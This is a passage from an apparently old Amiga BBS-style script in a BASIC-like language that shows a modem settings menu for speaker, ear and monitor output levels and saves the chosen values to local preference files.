Print Local " [33m- [0m2[33m -[0m Speaker Out "
Print Local " [33m- [0m3[33m -[0m Monitor Out "
Print Local " [33m- [0m4[33m -[0m Save Prefs !"
Print Local
Print Local " [33m- [0mI[33m -[0m Modem Init  "
Print Local
ASK Local "Please Select Function (0-4) >: ", F$
	F$ = LOWER$(F$)

	If F$==""
	 Gosub MainMenu
	Endif

	If F$=="i"
	 Gosub ModemInit
	Endif
	If F$=="2"
	 print local
	 Input Local "[33mSpeaker Output[0m (0-3).....>: ",SL$
	  If SL$==""
	    SL$="2"
	  Endif
	 MLR$=ALR$+SL$+RVG$
	Endif

	If F$=="1"
	 print local
	 Input Local "[33mEar Output[0m (0-255).....>: ",DV$
	  If DV$==""
	    DV$="100"
	  Endif
	 VGR$=SVG$+DV$+RVG$
	Endif

	If F$=="3"
	 print local
	 Input Local "[33mMonitor Output[0m (0-2).....>: ",GS$
	  If GS$==""
	    GS$="2"
	  Endif
	 GMLR$=GALR$+GS$+RVG$
	Endif

	If F$=="4"
	 print local
	 Ask Local "[33mSave Modem Prefs ?[0m (Y/N).....>: ",HS$
	  If HS$=="y"
	  open output 1, "ENV:Dialer02.prefs"
		  Write #1, DV$
		  Write #1, SL$
		  Write #1, GS$
		  Close #1
	  open output 1, "ENVARC:Dialer02.prefs"
		  Write #1, DV$
		  Write #1, SL$
		  Write #1, GS$
	  Close #1
		  Print Local ;"es Saving ..."
		  Pause 1
	    Goto ModemSet
	  else
		  Print Local ;" Not Saving ..."
		  Pause 1
	    Goto ModemSet
	  Endif
	Endif

Goto Modemset
END


